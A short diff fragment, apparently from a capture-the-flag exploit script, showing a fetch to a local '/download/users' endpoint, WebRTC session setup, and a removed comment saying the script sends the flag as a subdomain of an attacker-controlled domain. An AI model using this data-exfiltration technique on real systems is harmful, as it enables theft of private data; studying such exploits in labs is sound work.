@@ -32,4 +32,3 @@ fetch("http://localhost:3000/download/users") //download users
       await p.setLocalDescription();
     }
   });
-  // This script will send the flag as the subdomain of attacker controlled domain
